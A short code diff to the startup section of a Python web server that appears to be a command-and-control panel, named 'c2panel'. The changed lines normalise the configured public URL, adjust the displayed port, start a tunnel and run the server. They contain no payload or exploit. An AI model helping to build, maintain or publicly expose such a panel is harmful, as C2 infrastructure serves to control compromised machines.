@@ -1383,15 +4035,28 @@ if __name__ == "__main__":
 
     saved_url = get_config("public_url", "").strip()
     if saved_url:
+        if not (saved_url.startswith("http://") or saved_url.startswith("https://")):
+            saved_url = "https://" + saved_url
+            set_config("public_url", saved_url)
+        saved_url = saved_url.rstrip("/")
+        set_config("public_url", saved_url)
         if "c2panel.rog" in saved_url and ":8443" not in saved_url:
             set_config("public_url", "")
             print("[*] Removed old c2panel.rog URL (run setup_domain.sh then use https://c2panel.rog:8443)")
         else:
             PUBLIC_URL["url"] = saved_url
-            print(f"[*] Public URL: {saved_url}")
+            # Use actual port in displayed URL when running on non-default port
+            from urllib.parse import urlparse, urlunparse
+            parsed = urlparse(saved_url)
+            url_port = parsed.port or (443 if parsed.scheme == "https" else 80)
+            if parsed.hostname and url_port != args.port:
+                new_netloc = f"{parsed.hostname}:{args.port}" if args.port not in (80, 443) else parsed.hostname
+                displayed_url = urlunparse((parsed.scheme, new_netloc, parsed.path or "", parsed.params, parsed.query, parsed.fragment))
+                print(f"[*] Public URL: {displayed_url}")
+            else:
+                print(f"[*] Public URL: {saved_url}")
     if not PUBLIC_URL["url"]:
-        PUBLIC_URL["url"] = DEFAULT_LOCAL_DOMAIN
-        print(f"[*] Local domain: {DEFAULT_LOCAL_DOMAIN}")
+        print("[*] No public URL configured; using request origin for panel links")
 
     if not args.no_tunnel:
         start_tunnel(args.port)
@@ -1408,6 +4073,7 @@ if __name__ == "__main__":
 ╚══════════════════════════════════════════╝
 """)
     log_event("server_start", f"{args.host}:{args.port}")
+    _suppress_connection_errors()
     kwargs = dict(host=args.host, port=args.port, debug=args.debug, allow_unsafe_werkzeug=True)
     if ssl_ctx:
         import ssl
